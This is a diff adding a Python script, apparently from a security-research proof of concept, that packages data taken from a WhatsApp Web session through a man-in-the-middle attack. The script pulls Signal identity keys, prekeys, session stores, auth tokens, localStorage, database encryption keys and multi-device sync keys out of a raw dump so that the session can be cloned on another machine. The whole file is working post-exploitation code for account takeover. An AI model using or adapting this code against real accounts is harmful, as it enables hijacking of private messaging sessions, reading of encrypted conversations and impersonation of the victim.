@@ -1,0 +1,64 @@
+"""
+session_clone.py -- Clone package construction
+Demonstrates that exfiltrated data is sufficient to
+clone the WhatsApp session on another machine.
+"""
+import json
+from pathlib import Path
+from zipfile import ZipFile
+
+EVIDENCE_DIR = Path("evidence")
+
+def build_clone_package():
+    raw = json.loads(
+        (EVIDENCE_DIR / "full_dump" / "00_FULL_RAW_DUMP.json")
+        .read_text()
+    )
+
+    # Critical components for cloning
+    clone_data = {
+        "metadata": {
+            "source": "WA_WEB_URL MITM exfiltration",
+            "purpose": "Security research"
+        },
+
+        # 1. Signal keys -- E2E core
+        "signal_identity": None,
+        "signal_prekeys": None,
+        "signal_sessions": None,
+        "signal_signed_prekey": None,
+        "signal_meta": None,
+
+        # 2. Authentication tokens
+        "auth_tokens": None,
+        "localStorage": None,
+
+        # 3. Local database encryption keys
+        "db_encryption_keys": None,
+
+        # 4. Multi-device sync keys
+        "sync_keys": None,
+    }
+
+    # Fill from exfiltrated data
+    if 'signal-storage' in raw and 'data' in raw['signal-storage']:
+        sig = raw['signal-storage']['data']
+        clone_data['signal_identity'] = sig.get('identity-store')
+        clone_data['signal_prekeys'] = sig.get('prekey-store')
+        clone_data['signal_sessions'] = sig.get('session-store')
+        clone_data['signal_signed_prekey'] = \
+            sig.get('signed-prekey-store')
+        clone_data['signal_meta'] = sig.get('signal-meta-store')
+
+    if 'localStorage' in raw:
+        clone_data['localStorage'] = raw['localStorage']
+
+    if 'wawc_db_enc' in raw and 'data' in raw['wawc_db_enc']:
+        clone_data['db_encryption_keys'] = \
+            raw['wawc_db_enc']['data']
+
+    if 'model-storage' in raw and 'data' in raw['model-storage']:
+        ms = raw['model-storage']['data']
+        clone_data['sync_keys'] = ms.get('sync-keys')
+
+    return clone_data
